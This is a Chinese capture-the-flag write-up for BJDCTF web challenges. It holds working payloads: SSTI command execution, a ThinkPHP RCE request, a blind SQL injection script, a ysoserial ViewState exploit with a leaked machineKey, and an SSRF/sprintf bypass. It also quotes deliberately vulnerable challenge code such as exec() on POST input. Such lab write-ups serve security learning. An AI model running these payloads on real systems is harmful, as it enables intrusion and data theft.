categories:
- 比赛
tags:
- ctf
- wp
title: BJDCTF
---
# BJDCTF

## web

### fake google

```
{{%27%27.__class__.__mro__[1].__subclasses__()[-13].__init__.__globals__.__builtins__.eval(%27__import__("os").popen("find%20/%20-name%20*flag*").read()%27)}}
```



### old_hack

```php
POST /?s=captcha HTTP/1.1
Host: eb9ceebf-0bf5-4943-8580-9ccbf630568e.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
DNT: 1
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 70

_method=__construct&filter%5B%5D=system&method=get&get%5B%5D=cat+/flag
```



### duangShell

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>give me a girl</title>
</head>
<body>
    <center><h1>珍爱网</h1></center>
</body>
</html>
<?php
error_reporting(0);
echo "how can i give you source code? .swp?!"."<br>";
if (!isset($_POST['girl_friend'])) {
    die("where is P3rh4ps's girl friend ???");
} else {
    $girl = $_POST['girl_friend'];
    if (preg_match('/\>|\\\/', $girl)) {
        die('just girl');
    } else if (preg_match('/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i', $girl)) {
        echo "<img src='img/p3_need_beautiful_gf.png'> <!-- He is p3 -->";
    } else {
        //duangShell~~~~
        exec($girl);
    }
}


```





### 简单注入

```python
username=a\&password=/if(1,sleep(5),1)%23
username=a\&password=/if(select/**/substr(group_concat(database()),1,1),sleep(5),1)%23
username=a\&password=/if(substr(hex(password),1,1)<5,sleep(5),1)%23
```





过滤:`=,',;`

```python
import requests
import time
burp0_url = "http://f9dc5389-32c2-48b6-a208-cd32482ef972.node3.buuoj.cn:80/index.php"
burp0_cookies = {"_ga": "GA1.2.212283867.1584191400", "_gid": "GA1.2.1374622556.1584775121"}
burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36", "Origin": "http://f9dc5389-32c2-48b6-a208-cd32482ef972.node3.buuoj.cn", "Content-Type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://f9dc5389-32c2-48b6-a208-cd32482ef972.node3.buuoj.cn/index.php", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
burp0_data = {"username": "a\\", "password": "/if(substr(hex(password),1,1)<5,sleep(6),1)#"}
count=0
result=""
while True:
    count+=1
    for i in "123456789ABCDEFG":
        burp0_data = {"username": "a\\", "password": "/if(substr(hex(password),POS,1)<GUESS,sleep(5),1)#".replace("POS",str(count)).replace("GUESS",hex(ord(i)))}
        print(burp0_data['password'])
        try:
            requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,timeout=5)
            time.sleep(0.5)
        except:
            result+=chr(ord(i)-1)
            print(result)
            break
print(result)#4F68794F75464F754E646974#OhyOuFOuNdit
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
```



### Schrödinger

更改cookie拿到密码

av11664517@1583985203.

 https://www.bilibili.com/video/av11664517 

 BJD{Quantum_Mechanics_really_Ez} 

### asp

 https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/ 

```
http://ff9359c1-85b4-4f2a-a1ad-31c1e40f186d.node3.buuoj.cn//ImgLoad.aspx?path=5.gif
```

```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<machineKey validationKey="47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9" decryptionKey="B0E528C949E59127E7469C9AF0764506BAFD2AB8150A75A5" validation="SHA1" decryption="3DES" />
</system.web>
</configuration>

```

validationKey泄露,利用viewstatas来任意命令执行

```
ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile  -c "ExploitClass.cs;./dlls/System.dll;./dlls/System.Web.dll"  --generator="CA0B0334"  --validationalg="SHA1"  --validationkey="47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9"
```




### 套猪

登陆后找到一个提示

 L0g1n.php

经过输入一系列http头后拿到flag

```
GET /L0g1n.php HTTP/1.1
Host: node3.buuoj.cn:25341
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Contiki/1.1-rc1 (Commodore 64; http://dunkels.com/adam/contiki/)
From: root@gem-love.com
Referer: gem-love.com
Client-Ip: 127.0.0.1
Via: y1ng.vip
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=gppova7f172e56f11qlrffpb64; time=4740514103
Connection: close


```



### elementmaster



```python
import requests
import time
arr=["H", "He", "Li", "Be", "B", "C", "N", "O", "F", "Ne", "Na", "Mg", "Al", "Si", "P", "S", "Cl", "Ar", "K", "Ca", "Sc", "Ti", "V", "Cr", "Mn", "Fe", "Co", "Ni", "Cu", "Zn", "Ga", "Ge", "As", "Se", "Br", "Kr", "Rb", "Sr", "Y", "Zr", "Nb", "Mo", "Te", "Ru", "Rh", "Pd", "Ag", "Cd", "In", "Sn", "Sb", "Te", "I", "Xe", "Cs", "Ba", "La", "Ce", "Pr", "Nd", "Pm", "Sm", "Eu", "Gd", "Tb", "Dy", "Ho", "Er", "Tm", "Yb", "Lu", "Hf", "Ta", "W", "Re", "Os", "Ir", "Pt", "Au", "Hg", "Tl", "Pb", "Bi", "Po", "At", "Rn", "Fr", "Ra", "Ac", "Th", "Pa", "U", "Np", "Pu", "Am", "Cm", "Bk", "Cf", "Es", "Fm","Md","No","Lr","Ku","Ha"]

url="http://aca57d0d-cd67-498b-a8ea-09588ab05db6.node3.buuoj.cn/"
for i in arr:
    r=requests.get(url+i+".php")
    if r.status_code==200:
        print(r.text,end="")
    time.sleep(0.5)

```

`And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php`



### xss

sb题目

index.php

```php
<?php
   $a=$_GET['yds_is_so_beautiful'];
	echo unserialize($a);
   ?>
```



### 文件探测



http头中找到hint:` home.php `

```
http://3801f870-f245-47ef-8325-1e117f384eb8.node3.buuoj.cn/home.php?file=system
```

尝试文件包含,拿到源码

```php
<?php
error_reporting(0);
if (!isset($_COOKIE['y1ng']) || $_COOKIE['y1ng'] !== sha1(md5('y1ng'))){
    echo "<script>alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');</script>";
    header("Refresh:0.1;url=index.php");
    die;
}

$str2 = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error:&nbsp;&nbsp;url invalid<br>~$ ';
$str3 = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error:&nbsp;&nbsp;damn hacker!<br>~$ ';
$str4 = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error:&nbsp;&nbsp;request method error<br>~$ ';

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>File Detector</title>

    <link rel="stylesheet" type="text/css" href="css/normalize.css" />
    <link rel="stylesheet" type="text/css" href="css/demo.css" />

    <link rel="stylesheet" type="text/css" href="css/component.css" />

    <script src="js/modernizr.custom.js"></script>

</head>
<body>
<section>
    <form id="theForm" class="simform" autocomplete="off" action="system.php" method="post">
        <div class="simform-inner">
            <span><p><center>File Detector</center></p></span>
            <ol class="questions">
                <li>
                    <span><label for="q1">ä½ ç¥éç®å½ä¸é½æä»ä¹æä»¶å?</label></span>
                    <input id="q1" name="q1" type="text"/>
                </li>
                <li>
                    <span><label for="q2">è¯·è¾å¥ä½ æ³æ£æµæä»¶åå®¹é¿åº¦çurl</label></span>
                    <input id="q2" name="q2" type="text"/>
                </li>
                <li>
                    <span><label for="q1">ä½ å¸æä»¥ä½ç§æ¹å¼è®¿é®ï¼GETï¼POST?</label></span>
                    <input id="q3" name="q3" type="text"/>
                </li>
            </ol>
            <button class="submit" type="submit" value="submit">æäº¤</button>
            <div class="controls">
                <button class="next"></button>
                <div class="progress"></div>
                <span class="number">
					<span class="number-current"></span>
					<span class="number-total"></span>
				</span>
                <span class="error-message"></span>
            </div>
        </div>
        <span class="final-message"></span>
    </form>
    <span><p><center><a href="https://gem-love.com" target="_blank">@é¢å¥L'Amore</a></center></p></span>
</section>

<script type="text/javascript" src="js/classie.js"></script>
<script type="text/javascript" src="js/stepsForm.js"></script>
<script type="text/javascript">
    var theForm = document.getElementById( 'theForm' );

    new stepsForm( theForm, {
        onSubmit : function( form ) {
            classie.addClass( theForm.querySelector( '.simform-inner' ), 'hide' );
            var messageEl = theForm.querySelector( '.final-message' );
            form.submit();
            messageEl.innerHTML = 'Ok...Let me have a check';
            classie.addClass( messageEl, 'show' );
        }
    } );
</script>

</body>
</html>
<?php

$filter1 = '/^http:\/\/127\.0\.0\.1\//i';
$filter2 = '/.?f.?l.?a.?g.?/i';


if (isset($_POST['q1']) && isset($_POST['q2']) && isset($_POST['q3']) ) {
    $url = $_POST['q2'].".y1ng.txt";
    $method = $_POST['q3'];

    $str1 = "~$ python fuck.py -u \"".$url ."\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei<br>";

    echo $str1;

    if (!preg_match($filter1, $url) ){
        die($str2);
    }
    if (preg_match($filter2, $url)) {
        die($str3);
    }
    if (!preg_match('/^GET/i', $method) && !preg_match('/^POST/i', $method)) {
        die($str4);
    }
    $detect = @file_get_contents($url, false);
    print(sprintf("$url method&content_size:$method%d", $detect));
}

?>

```

home.php

```php
<?php

setcookie("y1ng", sha1(md5('y1ng')), time() + 3600);
setcookie('your_ip_address', md5($_SERVER['REMOTE_ADDR']), time()+3600);

if(isset($_GET['file'])){
    if (preg_match("/\^|\~|&|\|/", $_GET['file'])) {
        die("forbidden");
    }

    if(preg_match("/.?f.?l.?a.?g.?/i", $_GET['file'])){
        die("not now!");
    }

    if(preg_match("/.?a.?d.?m.?i.?n.?/i", $_GET['file'])){
        die("You! are! not! my! admin!");
    }

    if(preg_match("/^home$/i", $_GET['file'])){
        die("不要套娃");
    }

    else{
        if(preg_match("/home$/i", $_GET['file']) or preg_match("/system$/i", $_GET['file'])){
            $file = $_GET['file'].".php";
        }
        else{
            $file = $_GET['file'].".fxxkyou!";
        }
        echo "你现在访问的是".$file . "<br>";
        require $file;
    }
} else {
    echo "<script>location.href='./home.php?file=system'</script>";
}
```



我们看到:

```php
$filter1 = '/^http:\/\/127\.0\.0\.1\//i';
$filter2 = '/.?f.?l.?a.?g.?/i';    
if (!preg_match($filter1, $url) ){
        die($str2);
    }
    if (preg_match($filter2, $url)) {
        die($str3);
    }
    if (!preg_match('/^GET/i', $method) && !preg_match('/^POST/i', $method)) {
        die($str4);
    }
    $detect = @file_get_contents($url, false);
    print(sprintf("$url method&content_size:$method%d", $detect));
```





我们利用`$method`来转义`%d`,在`$url`中加个`%s`就可以查看ssrf的内容了





扫描目录发现:admin.php,但是要从内网访问

ssrf访问得到

```php
0 <?php
error_reporting(0);
session_start();
$f1ag = 'f1ag{s1mpl3_SSRF_@nd_spr1ntf}'; //fake

function aesEn($data, $key)
{
    $method = 'AES-128-CBC';
    $iv = md5($_SERVER['REMOTE_ADDR'],true);
    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));
}

function Check()
{
    if (isset($_COOKIE['your_ip_address']) && $_COOKIE['your_ip_address'] === md5($_SERVER['REMOTE_ADDR']) && $_COOKIE['y1ng'] === sha1(md5('y1ng')))
        return true;
    else
        return false;
}

if ( $_SERVER['REMOTE_ADDR'] == "127.0.0.1" ) {
    highlight_file(__FILE__);
} else {
    echo "<head><title>403 Forbidden</title></head><body bgcolor=black><center><font size='10px' color=white><br>only 127.0.0.1 can access! You know what I mean right?<br>your ip address is " . $_SERVER['REMOTE_ADDR'];
}


$_SESSION['user'] = md5($_SERVER['REMOTE_ADDR']);

if (isset($_GET['decrypt'])) {
    $decr = $_GET['decrypt'];
    if (Check()){
        $data = $_SESSION['secret'];
        include 'flag_2sln2ndln2klnlksnf.php';
        $cipher = aesEn($data, 'y1ng');
        if ($decr === $cipher){
            echo WHAT_YOU_WANT;
        } else {
            die('爬');
        }
    } else{
        header("Refresh:0.1;url=index.php");
    }
} else {
    //I heard you can break PHP mt_rand seed
    mt_srand(rand(0,9999999));
    $length = mt_rand(40,80);
    $_SESSION['secret'] = bin2hex(random_bytes($length));
}
?>
```

我们发现如果我们带decrypt参数直接访问,就不会生成secret了,那么`$cipher = aesEn('', 'y1ng');`